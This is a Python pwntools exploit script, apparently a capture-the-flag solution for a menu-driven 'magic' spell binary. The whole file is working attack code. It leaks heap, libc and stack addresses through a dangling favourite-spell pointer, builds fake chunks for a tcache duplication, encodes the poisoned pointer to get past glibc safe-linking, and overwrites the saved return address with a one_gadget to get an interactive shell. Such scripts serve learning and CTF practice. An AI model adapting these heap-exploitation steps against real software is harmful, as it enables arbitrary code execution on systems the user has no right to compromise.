from pwn import *
elf=ELF("magic")
libc=ELF("libc.so.6")
p=process(elf.path)
#
#p = gdb.debug(elf.path, aslr=False, gdbscript=
#	'''
#	continue
#'''	)
context.log_level = 'info'
p.recvuntil(b">")
p.send(b"Alohomora!!")

def magic_number(inputIndex : bytes,inputBytes :bytes):

	p.recvuntil(b">")
	p.sendline(b"1")
	p.recvuntil(b"Index for magic number:")
	p.sendline(inputIndex)
	p.recvuntil(b"Magic number:")
	p.sendline(inputBytes)

def create_spell(inputBytes: bytes):
	p.recvuntil(b">")
	p.sendline(b"2")
	p.recvuntil(b"Spell: ")
	p.sendline(inputBytes)
	
def make_fav_spell(inputIndex: bytes,alreadySet: bool):
	p.recvuntil(b">")
	p.sendline(b"5")
	if(alreadySet):
		p.recvuntil(b"Favorite spell already set.")
		return
	p.recvuntil(b"Index for Favorite spell:")
	p.sendline(inputIndex)


def read_fav_spell():
	p.recvuntil(b">")
	p.sendline(b"4")
	return p.recvuntil(b"1)")

def free_spell(indexSpell: bytes):
	p.recvuntil(b">")
	p.sendline(b"3")
	p.recvuntil(b"Index: ")
	p.sendline(indexSpell)

def modify_second_pointer(indexBytes: bytes):
	magic_number(b"1",str(indexBytes).encode())
	magic_number(b"2",str(indexBytes).encode())
	magic_number(b"3",str(indexBytes).encode())
	magic_number(b"4",str(indexBytes).encode())
	make_fav_spell(b"1",alreadySet=True) #chunkB
	return

create_spell(b"A" * 0x7)
create_spell(b"B" * 0xff)
free_spell(b"0") #chunkA

#1 and 3 for first and adds a 00 to second chunk
magic_number(b"1", str(0x1111).encode())
magic_number(b"3", str(0x1111).encode())

#2 and 4 for second and adds a 00 to first chunk
#magic_number(str(2), str(0x24))
#magic_number(str(4), str(0x12))
make_fav_spell(b"1",alreadySet=False) #chunkB


heap_leak=read_fav_spell()
heap_leak = int.from_bytes(heap_leak[0x4f4:0x4fc], "little")
heap_leak = heap_leak << 4
log.info("Heap Leak: %s",hex(heap_leak))


create_spell(b"b" * 0x88)
create_spell(b"c" * 0x88)
create_spell(b"d" * 0x88)
create_spell(b"e" * 0x88)
create_spell(b"f" * 0x88)
create_spell(b"g" * 0x88)
create_spell(b"i" * 0x88)
create_spell(b"j" * 0x88)

free_spell(b"9")
free_spell(b"8")
free_spell(b"7")
free_spell(b"6")
free_spell(b"5")
free_spell(b"4")
free_spell(b"3")
free_spell(b"2")

main_arena_leak=heap_leak+0x2d7
modify_second_pointer(main_arena_leak)
main_arena=read_fav_spell()
main_arena=int.from_bytes(main_arena[0x56A:0x570],"little")
main_arena=main_arena-0x60
log.info("Main Arena: %s",hex(main_arena))

libc.address=main_arena-0x1D3C80
log.info("LibC Leak: %s",hex(libc.address))

#Stack Leak
__environ_addr = libc.address + 0x1db227 # original is 0x1db320, found at 0x127, 0x56c from 0x1db100
modify_second_pointer(__environ_addr)
raw = read_fav_spell()
stack=int.from_bytes(raw[0x56a:0x570],"little")
log.info("Stack leak: %s",hex(stack))


#fake chunk for tcachebin dup
fake_chunk1=p64(0x31)+p64(0x1)+p64(0x2)+p64(0x3)+p64(0x4)+p64(0x5)
fake_chunk_size=len(p64(0)+fake_chunk1*0x2)
create_spell(p64(0)+fake_chunk1 * 0x2)

modify_second_pointer(heap_leak+0x410)
free_spell(b"1")
modify_second_pointer(heap_leak+0x3e0)
free_spell(b"1")

#now free original
modify_second_pointer(heap_leak+0x3d0)
free_spell(b"1")

#where we write (overwrite RIP)
rbp_location_envrion=stack - 0x1A8 # for allignment otherwise it's 0x1A0
fd_addr=heap_leak+0x3d0
mask=fd_addr >> 12
encoded_target=rbp_location_envrion ^ mask

#what I write (here we will use the onegadget)
fake_addr = libc.address+0x4c5c9


rip_overwrite=p64(encoded_target)+p64(0)
create_spell(rip_overwrite*4+(b"A")*(fake_chunk_size-64))
create_spell(p64(fake_addr)+b'A'*0x18)
create_spell(p64(fake_addr)+p64(fake_addr)+p64(fake_addr)+p64(fake_addr))
log.info("Exploit Done!")
p.interactive()
